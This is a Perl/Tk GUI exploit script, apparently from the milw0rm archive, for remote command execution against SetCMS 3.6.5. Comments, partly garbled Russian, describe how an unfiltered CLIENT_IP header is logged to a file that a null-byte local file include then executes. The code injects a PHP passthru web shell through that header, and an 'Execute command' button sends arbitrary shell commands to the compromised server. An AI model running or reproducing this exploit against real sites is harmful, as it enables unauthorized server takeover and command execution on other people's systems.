#!/usr/bin/perl

## SetCMS v3.6.5 (setcms.org) remote commands execution exploit by RST/GHC
## o4.o9.2oo6
## (c)oded by 1dt.w0lf

## THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
## KEEP IT PRIVATE

## Ð¿Ñ€Ð¾ Ð±Ð°Ð³Ñƒ:
##
## file: functions.php
##
## FUNCTION ip(){
## global $user_id;
## if(getenv('HTTP_CLIENT_IP')) {$user_ip = getenv('HTTP_CLIENT_IP');}
## elseif(getenv('HTTP_X_FORWARDED_FOR')){$user_ip = getenv('HTTP_X_FORWARDED_FOR');}
## elseif(getenv('REMOTE_ADDR')) {$user_ip = getenv('REMOTE_ADDR');}
## else{$user_ip='unknown';}
## if(15 < strlen($user_ip))
## {
## $ar = split(', ', $user_ip);
## for($i=0; $i < sizeof($ar); $i++)
## {
## if($ar[$i]!='' and !ereg('[a-zA-Z]', $ar[$i])){$user_ip = $ar[$i]; break; }
## if($i==sizeof($user_ip_pass)-1){$user_ip = 'unknown';}
## }
## }
## if(ereg('unknown', $user_ip) and $user_id!=''){ $user_ip .= $user_id; }
## return $user_ip;
## }
##
## Ñ‚Ð°ÐºÐ¸Ð¼ Ð¾Ð±Ñ€Ð°Ð·Ð¾Ð¼ Ð·Ð°Ð³Ð¾Ð»Ð¾Ð²ÐºÐ¸ HTTP Ð½Ðµ Ñ„Ð¸Ð»ÑŒÑ‚Ñ€ÑƒÑŽÑ‚ÑÑ Ð¸ Ð¼Ð¾Ð¶Ð½Ð¾ Ð¿ÐµÑ€ÐµÐ´Ð°Ñ‚ÑŒ Ð½ÐµÐ¾Ð±Ñ…Ð¾Ð´Ð¸Ð¼Ñ‹Ðµ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð² CLIENT_IP Ð¸Ð»Ð¸ X_FORWARDED_FOR
## ... Ð´Ð°Ð»ÐµÐµ
##
## file: modules/users/index.php
##
## if ($mc == "enter" && (!isset($do) || $do == ""))
## {
## ...
## if ($enter == "0")
## {
## $fp = fopen("files/enter.set", "a+");
## flock($fp, LOCK_EX);
## fwrite($fp, "$date::".regreplace($_POST['login'])."::".regreplace($_POST['pass'])."::$ip::\r\n");
## flock($fp, LOCK_UN);
## fclose($fp);
## $text.= "<center>ÐÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ð¾Ðµ ÑÐ¾Ñ‡ÐµÑ‚Ð°Ð½Ð¸Ðµ Ð¸Ð¼ÐµÐ½Ð¸ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ Ð¸ Ð¿Ð°Ñ€Ð¾Ð»Ñ. Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ Ð¾ Ð²Ð°ÑˆÐµÐ¹ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÐµ Ð²Ñ…Ð¾Ð´Ð° Ð·Ð°Ð¿Ð¸ÑÐ°Ð½Ð° Ð² Ð»Ð¾Ð³-Ñ„Ð°Ð¹Ð».</center>";
##
## ÐŸÑ€Ð¸ Ð½ÐµÑƒÐ´Ð°Ñ‡Ð½Ð¾Ð¹ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÐµ Ð²Ñ…Ð¾Ð´Ð°, Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÐµÐ½Ð½Ñ‹Ðµ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð·Ð°Ð¿Ð¸ÑÑ‹Ð²Ð°ÑŽÑ‚ÑÑ Ð² Ñ„Ð°Ð¹Ð» files/enter.set, Ð²ÐºÐ»ÑŽÑ‡Ð°Ñ $ip =)
##
## Ð˜ Ð·Ð°ÐºÐ°Ð½Ñ‡Ð¸Ð²Ð°Ñ
##
## file: index.php
##
## $set = $_GET['set'];
## ...
## //urls
## if (file_exists("modules/$set/index.php"))
## {
## if(file_exists("modules/$set/config.php")){include("modules/$set/config.php");}
## include("modules/$set/index.php");
## }
##
## Ð›Ð¾ÐºÐ°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¸Ð½ÐºÐ»ÑƒÐ´ Ð½Ð°Ð»Ð¸Ñ†Ð¾ =)
## index.php?set=../files/enter.set%00
## ÐŸÑ€Ð°Ð²Ð´Ð° Ð¿Ñ€Ð¸ ÑƒÑÐ»Ð¾Ð²Ð¸Ð¸ magic = off
##
## eof

use Tk;
use Tk::Menu;
use LWP::UserAgent;
use Tk::DialogBox;

$top = MainWindow->new();
$top->resizable(0,0);

$path = 'http://server/setcms/index.php';
$cmd = 'id; uname -a; ls -la';
$xpl = LWP::UserAgent->new() or die;

$top->title("r57setcms365");
Dialog2::ui($top);

Dialog2::run() if defined &Dialog2::run;

Tk::MainLoop();

sub Dialog2::ui {
our($root) = @_;


# Widget Initialization
$_entry_1 = $root->Entry(
-font => 'Verdana 8',
-relief => "groove",
-textvariable => \$path,
-width => 0,
);
$_entry_2 = $root->Entry(
-font => 'Verdana 8',
-relief => "groove",
-textvariable => \$cmd,
-width => 0,
);
our($_label_1) = $root->Label(
-font => 'Verdana 8',
-text => "Path to index.php : ",
);
our($_label_2) = $root->Label(
-font => 'Verdana 8',
-text => "Command for execute : ",
);
our($_label_3) = $root->Label(
-font => 'Verdana 8',
-text => " >>> SetCMS 3.6.5 RCE sploit by RST/GHC",
);
our($_button_1) = $root->Button(
-font => 'Verdana 8 bold',
-relief => "groove",
-text => "Execute command",
);
our($_button_2) = $root->Button(
-font => 'Verdana 8 bold',
-relief => "groove",
-text => "Create shell",
);
$_text_1 = $root->Text(
-font => 'Verdana 8',
-height => 0,
-relief => "groove",
-width => 0,
);
our($_label_4) = $root->Label(
-font => 'Verdana 8',
-text => " (c)oded by 1dt.w0lf , RST/GHC , o4/o9/2oo6 , priv8",
);

# widget commands


$_button_1->configure(
-command => \&execute
);
$_button_2->configure(
-command => \&create_shell
);


# Geometry Management
$_entry_1->grid(
-in => $root,
-column => 2,
-row => 2,
-columnspan => 2,
-ipadx => 0,
-ipady => 0,
-padx => 4,
-pady => 4,
-rowspan => 1,
-sticky => "ew"
);
$_entry_2->grid(
-in => $root,
-column => 2,
-row => 3,
-columnspan => 2,
-ipadx => 0,
-ipady => 0,
-padx => 4,
-pady => 4,
-rowspan => 1,
-sticky => "ew"
);
$_label_1->grid(
-in => $root,
-column => 1,
-row => 2,
-columnspan => 1,
-ipadx => 0,
-ipady => 0,
-padx => 0,
-pady => 0,
-rowspan => 1,
-sticky => "e"
);
$_label_2->grid(
-in => $root,
-column => 1,
-row => 3,
-columnspan => 1,
-ipadx => 0,
-ipady => 0,
-padx => 0,
-pady => 0,
-rowspan => 1,
-sticky => "e"
);
$_label_3->grid(
-in => $root,
-column => 1,
-row => 1,
-columnspan => 3,
-ipadx => 0,
-ipady => 0,
-padx => 0,
-pady => 0,
-rowspan => 1,
-sticky => "w"
);
$_button_1->grid(
-in => $root,
-column => 3,
-row => 4,
-columnspan => 1,
-ipadx => 0,
-ipady => 0,
-padx => 4,
-pady => 4,
-rowspan => 1,
-sticky => ""
);
$_button_2->grid(
-in => $root,
-column => 2,
-row => 4,
-columnspan => 1,
-ipadx => 0,
-ipady => 0,
-padx => 4,
-pady => 4,
-rowspan => 1,
-sticky => "e"
);
$_text_1->grid(
-in => $root,
-column => 1,
-row => 5,
-columnspan => 3,
-ipadx => 0,
-ipady => 0,
-padx => 5,
-pady => 5,
-rowspan => 1,
-sticky => "news"
);
$_label_4->grid(
-in => $root,
-column => 1,
-row => 6,
-columnspan => 2,
-ipadx => 0,
-ipady => 0,
-padx => 0,
-pady => 0,
-rowspan => 1,
-sticky => "w"
);


# Resize Behavior
$root->gridRowconfigure(1, -weight => 0, -minsize => 6, -pad => 0);
$root->gridRowconfigure(2, -weight => 0, -minsize => 2, -pad => 0);
$root->gridRowconfigure(3, -weight => 0, -minsize => 2, -pad => 0);
$root->gridRowconfigure(4, -weight => 0, -minsize => 2, -pad => 0);
$root->gridRowconfigure(5, -weight => 0, -minsize => 361, -pad => 0);
$root->gridRowconfigure(6, -weight => 0, -minsize => 21, -pad => 0);
$root->gridColumnconfigure(1, -weight => 0, -minsize => 110, -pad => 0);
$root->gridColumnconfigure(2, -weight => 0, -minsize => 291, -pad => 0);
$root->gridColumnconfigure(3, -weight => 0, -minsize => 2, -pad => 0);
}

sub create_shell()
{
$_text_1->delete("0.0",'end');
$already = 0;
$res = $xpl->get($path."?set=../files/enter.set%00");
if(!$res->is_success) { &connect_error(); }
else
{
if($res->content =~ /pes_barbos/) { $already = 1; }
}
if($already) { $_text_1->insert('end', "[!] Shell already created\n"); }
else {
$res = $xpl->post($path."?set=users&mc=enter",
[
'login' => 'pes_barbos',
'pass' => 'pes_barbos',
],
'CLIENT_IP' => '86.12.56.33 <? if(isset($_POST[\'RSTGHC\'])){ echo "R57SETCMSXPL"; passthru($_POST[\'RSTGHC\']); echo "R57SETCMSXPL"; } ?>',
);
if(!$res->is_success) { &connect_error(); }
else
{
$_text_1->insert('end', "[+] Shell created!\n[+] Now you can execute commands!\n");
}
}
}

sub execute()
{
$_text_1->delete("0.0",'end');
$_text_1->insert('end',"[~] Try execute command\n");
$res = $xpl->post($path."?set=../files/enter.set%00",['RSTGHC'=>$cmd]);
if(!$res->is_success) { &connect_error(); }
else
{
@rez = split("R57SETCMSXPL",$res->content);
$_text_1->insert('end',@rez[1]);
$_text_1->insert('end',"[+] EOF\n");
}
}

sub connect_error()
{
$_text_1->insert('end', "[-] Error: ".$res->status_line."\n");
}
1;

# milw0rm.com [2008-01-22]
